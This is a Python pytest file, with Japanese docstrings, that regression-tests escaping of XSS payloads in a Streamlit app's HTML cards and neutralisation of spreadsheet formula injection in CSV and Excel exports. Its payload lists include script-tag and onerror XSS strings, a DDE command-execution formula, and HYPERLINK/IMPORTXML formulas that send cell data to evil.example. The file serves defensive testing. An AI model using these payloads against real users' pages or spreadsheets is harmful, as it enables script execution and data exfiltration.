"""セキュリティ強化の回帰テスト（R1-A / R1-B）。

ここで守るもの:

* **R1-A**: Streamlit の ``unsafe_allow_html=True`` はサーバー側でサニタイズしない。
  ユーザー入力（園名・氏名など）が HTML として解釈されると**ブラウザ上で JS が実行される**。
* **R1-B**: 出力 CSV / Excel のセル値も同様に**数式として実行されうる**。

いずれも「悪意のある文字列を実際に渡して、出力に実行可能な形が残っていないこと」を
主張する。AppTest や CBC を要さず純粋な関数で検証できるため、高速かつ安定。
"""

from __future__ import annotations

import csv
import io
from typing import Any

import pandas as pd
import pytest
from openpyxl import load_workbook

from shiftai.exporter import (
    _neutralize_formula_cells,
    to_csv_bytes,
    to_excel_bytes,
)
from shiftai.ui.components import metric_html
from shiftai.ui.theme import _safe_css_color

#: 実際に攻撃に使う文字列。1 文字でも.Output にそのまま出たら脆弱。
XSS_PAYLOADS = (
    "<img src=x onerror=alert(1)>",
    "<script>alert('xss')</script>",
    '"><svg onload=alert(1)>',
    "<iframe src=javascript:alert(1)>",
)

#: 出力 CSV / Excel で実行されうる数式。
FORMULA_PAYLOADS = (
    "=1+1",
    "-2+3",
    "@SUM(A1)",
    "=cmd|'/c calc'!A1",
    '=HYPERLINK("http://evil.example/?d="&A1,"click me")',
    '=IMPORTXML(CONCAT("http://evil.example/?v=",A1),"//a")',
    "  =1+1",
    "\t=1+1",
    "\r=1+1",
)


# ---------------------------------------------------------------------------
# R1-A: HTML 注入
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("payload", XSS_PAYLOADS)
def test_metric_rowはlabelをエスケープする(payload: str) -> None:
    """KPI カードの label にタグが来ても生タグが出ないこと。"""
    body, _css = metric_html(payload, "10 名", None)
    assert payload not in body, f"label に生の HTML が残った: {body}"
    assert "&lt;" in body, f"エスケープされていない: {body}"


@pytest.mark.parametrize("payload", XSS_PAYLOADS)
def test_metric_rowはvalueをエスケープする(payload: str) -> None:
    """KPI カードの value にタグが来ても生タグが出ないこと。"""
    body, _css = metric_html("園児数", payload, None)
    assert payload not in body
    assert "&lt;" in body


@pytest.mark.parametrize("payload", XSS_PAYLOADS)
def test_metric_rowはnoteをエスケープする(payload: str) -> None:
    """KPI カードの note にタグが来ても生タグが出ないこと。

    ``note`` はサイドバーの「園名」``settings.facility_name`` が flow するため、
    実際にユーザー入力が到達する経路。
    """
    body, _css = metric_html("園児数", "10 名", payload)
    assert payload not in body
    assert "&lt;" in body


def test_metric_htmlは警告と情報の記号を保ったままエスケープする() -> None:
    """先頭の ``!`` / ``~`` は色指定として消費され、表示からは消えること。"""
    warn_body, warn_css = metric_html("超過", "!3 名", None)
    assert "shiftai-metric warn" in warn_css
    assert "3 名" in warn_body
    info_body, info_css = metric_html("参考", "~2 名", None)
    assert "shiftai-metric info" in info_css
    assert "2 名" in info_body


def test_metric_htmlは通常の値を壊さない() -> None:
    """エスケープしても通常の日本語・数値はそのまま読めること。"""
    body, css = metric_html("園児数", "30 名", "-shiftai 園")
    assert "園児数" in body
    assert "30 名" in body
    assert "shiftai 園" in body
    assert css == "shiftai-metric"
    assert "&amp;" not in body, "アンパサンドを二重エスケープしていない"


@pytest.mark.parametrize(
    ("color", "expected_ok"),
    [
        ("#FF0000", True),
        ("#abc", True),
        ("#AABBCCDD", True),
        ("red", False),
        ("red;} body{display:none", False),
        ('#000" onmouseover="alert(1)', False),
        ("#000; background:url(javascript:alert(1))", False),
    ],
)
def test_CSS色は安全なものだけ通す(color: str, expected_ok: bool) -> None:
    """``style="background:"`` を壊せる値は既定色へ落とすこと。"""
    from shiftai.config import COLOR_OFF

    got = _safe_css_color(color)
    if expected_ok:
        assert got == color
    else:
        assert got != color, f"危険な値をそのまま通した: {got!r}"
        assert got == COLOR_OFF, f"既定色へ落とすこと（got={got!r}）"


# ---------------------------------------------------------------------------
# R1-B: CSV / Excel の数式インジェクション
# ---------------------------------------------------------------------------


def _csv_column(values: list[Any]) -> list[str]:
    """出力を CSV として読み直し、0 列目の値を返す。"""
    frame = pd.DataFrame({"col": values})
    text = to_csv_bytes(frame).decode("utf-8-sig")
    rows = list(csv.reader(io.StringIO(text)))
    return [r[0] for r in rows[1:]]


@pytest.mark.parametrize("payload", FORMULA_PAYLOADS)
def test_CSV出力は数式で始まる値を無害化する(payload: str) -> None:
    """出力を Excel で開いても数式として実行されないこと。"""
    got = _csv_column([payload])[0]
    assert not got.lstrip(" \t\r").startswith(("=", "+", "-", "@")), (
        f"実行可能な数式が残った: {got!r}"
    )
    assert got.startswith("'"), f"引用符による無害化が無い: {got!r}"
    # 値自体は失われていない（information loss ではなく、安全化だけ）
    assert payload in got.lstrip("'")


def test_CSV無害化は数値に見える文字列を壊さない() -> None:
    """``-3.5`` や ``+2`` は Excel が数値として扱うので接頭辞を付けない。"""
    got = _csv_column(["-3.5", "+2", "-1"])
    assert got == ["-3.5", "+2", "-1"], f"数値文字列まで壊した: {got}"


def test_CSV無害化は通常の文字列を一切変えない() -> None:
    """日本語の氏名などに影響しないこと。"""
    for value in ("山田太郎", "保育士", "S001", "備考: 特記事項なし", ""):
        assert _csv_column([value])[0] == value


def test_CSV無害化は列名にも効く() -> None:
    """列名が ``=`` で始まる場合も（出力上は稀だが）無害化されること。"""
    frame = pd.DataFrame({"=cmd|'/c calc'!A1": [1]})
    text = to_csv_bytes(frame).decode("utf-8-sig")
    header = text.splitlines()[0]
    assert not header.lstrip("﻿ \t").startswith("="), f"列名が数式として出力されている: {header!r}"


def test_中和は元のDataFrameを変更しない() -> None:
    """呼び出し側の DataFrame を破壊しないこと（二重適用の誤爆防止）。"""
    frame = pd.DataFrame({"氏名": ["=1+1"]})
    out = _neutralize_formula_cells(frame)
    assert frame["氏名"].iloc[0] == "=1+1", "元の DataFrame が書き換わっている"
    assert out["氏名"].iloc[0] == "'=1+1"


@pytest.mark.parametrize("payload", FORMULA_PAYLOADS)
def test_Excel出力は数式として書かない(payload: str) -> None:
    """``.xlsx`` も数式として保存しないこと。

    ``openpyxl`` は ``=`` で始まる文字列を自動的に ``data_type="f"`` で書く。
    実際に保存して読み戻して確認する（推測しない）。
    先頭の空白・タブ・CR が Comes 場合は openpyxl が正規化したうえで
    文字列のまま保存されることも併せて確認する。
    """
    frame = pd.DataFrame({"氏名": [payload]})
    workbook = load_workbook(io.BytesIO(to_excel_bytes({"shift": frame})))
    cell = workbook["shift"].cell(row=2, column=1)
    assert cell.data_type != "f", (
        f"Excel に数式として保存された: value={cell.value!r} data_type={cell.data_type}"
    )
    assert cell.data_type == "s"
    assert payload.lstrip(" \t\r") in str(cell.value), "値そのものが変わっている"


def test_Excel出力は通常セルを文字列として保つ() -> None:
    """無害化によって通常の文字列や数値が壊れないこと。"""
    frame = pd.DataFrame({"氏名": ["山田太郎"], "回数": [3]})
    workbook = load_workbook(io.BytesIO(to_excel_bytes({"shift": frame})))
    sheet = workbook["shift"]
    assert sheet.cell(row=2, column=1).value == "山田太郎"
    assert sheet.cell(row=2, column=1).data_type == "s"
    assert sheet.cell(row=2, column=2).value == 3


def test_Excel出力はシート名とシート数が保たれる() -> None:
    """無害化の追加処理で workbook の構造を崩さないこと。"""
    frame = pd.DataFrame({"a": [1]})
    workbook = load_workbook(
        io.BytesIO(to_excel_bytes({"出勤": frame, "職員": frame, "出勤_2": frame}))
    )
    assert workbook.sheetnames == ["出勤", "職員", "出勤_2"]
    assert all(len(wb.sheetnames) == 3 for wb in [workbook])


# ---------------------------------------------------------------------------
# 守卫: 出力経路に漏れがないこと
# ---------------------------------------------------------------------------


#: ``.to_csv()`` を直接呼ぶことを**許可する**ファイルと行)$.
#: それぞれ無害化が不要である理由をコメントに残す。
#:
#: * ``exporter.py``    : ``to_csv_bytes`` / ``_neutralize_formula_cells`` の中身そのもの
#: * ``sample_data.py`` : 内部生成したサンプルデータ（ユーザー入力ではない）
#: * ``data_loader.py`` : 読み込み結果のサマリ（数値と件数のみ）
#: * ``ui/edit_history.py``: ハッシュ計算のためだけの文字列化（ファイルに書かない）
_ALLOWED_DIRECT_TO_CSV = {
    ("exporter.py", "to_csv_bytes 自身"),
    ("exporter.py", "_neutralize_formula_cells 自身"),
    ("sample_data.py", "内部生成サンプル"),
    ("data_loader.py", "読み込みサマリ"),
    ("ui/edit_history.py", "ハッシュ計算のみ"),
}


def test_ユーザー入力を含むCSVは全部無害化を通る() -> None:
    """``.to_csv()`` を直接呼ぶ箇所が新たに現れたら審査する。

    ``shift.csv`` / ``payroll.csv`` はユーザー由来の氏名を含むため、
    ``to_csv_bytes`` と同じ無害化を必ず通す必要がある。
    過去の実績として ``__main__.py`` の ``_write_csv`` が
    ZIP 出力側と別の経路で CSV を書いていたため、数式注入が
    CLI 出力にだけ漏れていた（本テストがそれを検出する）。
    """
    import pathlib

    root = pathlib.Path(__file__).resolve().parents[1] / "src" / "shiftai"
    offenders = []
    for path in sorted(root.rglob("*.py")):
        rel = path.relative_to(root).as_posix()
        text = path.read_text(encoding="utf-8")
        for lineno, line in enumerate(text.splitlines(), 1):
            if ".to_csv(" not in line:
                continue
            # 定義そのものと、無害化済みフレームへの呼び出しは除外
            if "def to_csv_bytes" in line or "def _neutralize_formula_cells" in line:
                continue
            if "_neutralize_formula_cells(frame).to_csv" in line:
                continue  # 既に無害化済み
            if any(f == rel for f, _ in _ALLOWED_DIRECT_TO_CSV):
                continue
            offenders.append(f"{rel}:{lineno}: {line.strip()[:70]}")
    assert not offenders, (
        "to_csv_bytes / _neutralize_formula_cells を経由せず CSV を書いている:\n"
        + "\n".join(offenders)
    )


def test_CLIがシフトCSVを書く経路も無害化を通る(tmp_path) -> None:
    """CLI の ``_write_csv`` が無害化を適用していることを実行で確認する。"""
    import pandas as pd

    from shiftai.__main__ import _write_csv

    frame = pd.DataFrame({"氏名": ["=cmd|'/c calc'!A1", "山田"]})
    path = _write_csv(frame, tmp_path / "shift.csv")
    text = path.read_text(encoding="utf-8-sig")
    body = [ln for ln in text.splitlines() if "cmd" in ln]
    assert body, "出力に何も書かれていない"
    assert not body[0].lstrip("﻿").startswith("="), f"CLI 出力に数式が残った: {body[0]!r}"
